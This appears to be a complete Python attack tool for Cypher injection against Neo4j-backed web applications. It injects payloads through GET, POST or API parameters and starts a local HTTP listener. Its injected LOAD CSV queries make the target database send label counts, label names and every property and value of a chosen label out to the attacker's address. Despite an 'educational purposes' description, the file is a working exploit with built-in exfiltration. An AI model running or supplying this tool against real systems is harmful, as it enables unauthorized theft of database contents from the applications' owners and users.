#!/usr/bin/python3
import argparse
import requests
import urllib.parse
import threading
import socket
from http.server import HTTPServer, BaseHTTPRequestHandler
import netifaces as ni
import queue
import re
import sys

# Initialize a queue to store received data
data_queue = queue.Queue()

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Log the incoming GET request path (which could contain the data)
        #print(f"Received data: {self.path}")
        # Put the received path into the queue
        data_queue.put(self.path)
        # Send a basic HTTP response
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"Received")
    
    # Suppress console logging of the HTTP server
    def log_message(self, format, *args):
        return

class Listener():
    def __init__(self, port):
        self.server = HTTPServer(("0.0.0.0", port), RequestHandler)

    def start_listener(self):
        print("Starting listener...")
        self.server.serve_forever()

    def stop_listener(self):
        print("Stopping listener...")
        self.server.shutdown()



class Neo4jInjector:
    def __init__(self, target, exfil_ip, listen_port, request_type, parameters, cookie=None):
        self.target = target
        self.exfil_ip = exfil_ip + ":" + str(listen_port)
        self.request_type = request_type
        self.parameters = parameters
        self.cookie = cookie
        # Check if a cookie was provided and split it into a dictionary if so
        self.headers = {
            'User-Agent': 'curl/8.5.0',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cookie': cookie
        }
        self.proxies = {
            'http': 'http://127.0.0.1:8080',
        }

    def inject_payload(self, payload):
        injection_characters = ["-1", "'", "\""]
        for injection_character in injection_characters:
            full_payload = injection_character + payload
            encoded_payload = urllib.parse.quote(full_payload, safe='')
            url, data = self.prepare_request_data(encoded_payload)
            self.execute_request(url, data)

    def prepare_request_data(self, encoded_payload):
        if self.request_type == "API":
            url = self.target + self.parameters + encoded_payload
            data = None
        elif self.request_type == "GET":
            url = f"{self.target}?{self.parameters}={encoded_payload}"
            data = None
        elif self.request_type == "POST":
            url = self.target
            data = f"{self.parameters}={encoded_payload}"
        else:
            raise ValueError("Invalid request type")
        return url, data

    def execute_request(self, url, data=None):
        try:
            if self.request_type == "POST":
                response = requests.post(url, data=data, headers=self.headers, allow_redirects=False)
                # print(response.status_code)
                # print(response.text)
             
            else:
                response = requests.get(url, headers=self.headers, proxies=self.proxies, allow_redirects=False)
                print("get")

            if response.status_code == 302:
                print("302 Redirect, Cookies Expired/Invalid ?")
                sys.exit()

            elif response.status_code == 200 and "Neo4jError".encode('utf-8') not in response.content:
                print(response.status_code)
                print(f"Payload Injected")



        except requests.exceptions.RequestException as e:
            print(f"Error occurred: {e}")

    def exfil_data(self):

        print("Dumping labels count")
        self.inject_payload(f" OR 1=1 WITH 1 as a CALL db.labels() yield label WITH COUNT(DISTINCT label) as l LOAD CSV FROM 'http://{self.exfil_ip}/?label_count='+l as x RETURN 0 as _0 // ")

        data = data_queue.get()  # Retrieve the next item from the queue
        parsed_data = extract_query_params(data)  # Use the previously defined function
        label_count = parsed_data.get('label_count', None)  # Extract the label value
        print(label_count)

        print("Dumping Labels")
        self.inject_payload(f" OR 1=1 WITH 1 as a CALL db.labels() yield label WITH DISTINCT label LOAD CSV FROM 'http://{self.exfil_ip}/?label='+label as l RETURN 0 as _0 //")

        # Store labels
        labels = []
        for i in range(int(label_count)):
            data = data_queue.get()  # Retrieve the next item from the queue
            parsed_data = extract_query_params(data)  # Use the previously defined function
            label_value = parsed_data.get('label', None)  # Extract the label value
            labels.append(label_value)


        label = input(f"Select label to dump {labels}: ")

        # print("Dumping Properties")
        # self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p WITH DISTINCT p LOAD CSV FROM 'http://{self.exfil_ip}/?keys=' + p as l RETURN 0 as _0 //")

        print("Dumping Values Property=Value")
        self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p WITH DISTINCT x,p LOAD CSV FROM 'http://{self.exfil_ip}/?keys=' + p +'='+replace(toString(x[p]),' ','') as l RETURN 0 as _0 //")

def get_ip_address(network_interface):
    return ni.ifaddresses(network_interface)[ni.AF_INET][0]['addr']

def extract_query_params(query_string):
    pattern = re.compile(r'([^&=?]+)=([^&=?]+)')
    matches = pattern.findall(query_string)
    params = {key: value for key, value in matches}
    return params

def main():
    parser = argparse.ArgumentParser(description="Inject payloads into Neo4j for educational purposes")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-p", "--parameters", required=False, default="", help="Vulnerable parameters")
    parser.add_argument("-c", "--cookie", required=False, help="Optional cookie in format key=value")
    parser.add_argument("-t", "--type", required=True, choices=['API', 'GET', 'POST'], help="Request type: API/GET/POST")
    parser.add_argument("-i", "--int", required=False, help="Network interface for dynamic IP retrieval")
    parser.add_argument("--listen-port", required=False, type=int, default=80, help="Port for the listener to capture incoming data")
    args = parser.parse_args()

    if ((args.type == "GET" or args.type == "POST") and args.parameters == ""):
        print("Parameter required for GET and POST methods")
        return

    if args.int:
        try:
            args.exfil_ip = get_ip_address(args.int)
        except ValueError:
            print("Error retrieving IP for specified interface")
            return
    else:
        args.exfil_ip = "127.0.0.1"

    listener = Listener(args.listen_port)
    listener_thread = threading.Thread(target=listener.start_listener)
    listener_thread.daemon = True
    listener_thread.start()


    injector = Neo4jInjector(args.url, args.exfil_ip, args.listen_port, args.type, args.parameters, args.cookie)
    injector.exfil_data()

    # Process data from the queue
    while not data_queue.empty():
        received_path = data_queue.get()
        print(f"Processing received data: {received_path}")
        # Here you can process the data as needed

    listener.stop_listener()
    listener_thread.join()

if __name__ == "__main__":
    main()